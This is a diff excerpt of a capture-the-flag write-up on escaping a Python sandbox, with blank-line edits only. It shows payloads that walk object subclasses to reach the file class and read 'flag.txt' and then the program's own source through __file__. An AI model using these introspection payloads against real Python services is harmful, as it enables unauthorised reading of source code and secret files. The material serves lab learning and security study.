@@ -24,11 +24,13 @@ print dict.__class__.__base__.__subclasses__()
 ```
 </br>
 The execution provided an output of numerous types in an array and most importantly, it provided '<type 'file'>'. Hence, with that we can try print the flag by using the read function.
+
 ```python
 print ().__class__.__bases__.__subclasses__()[40]('flag.txt', 'r').read()
 ```
 </br>
 We did not get any flags with the provided flag format. However, we were told that the flag is in the source code. But we do not know which file the source code is located in. However, Python creates a __file__ variable for itself when it is about to import a module and the __file__ is a variable that contains the path to the module that is currently being imported. So we can replace 'flag.txt' with __file__
+
 ```python
 print ().__class__.__bases__.__subclasses__()[40](__file__, 'r').read()
 ```
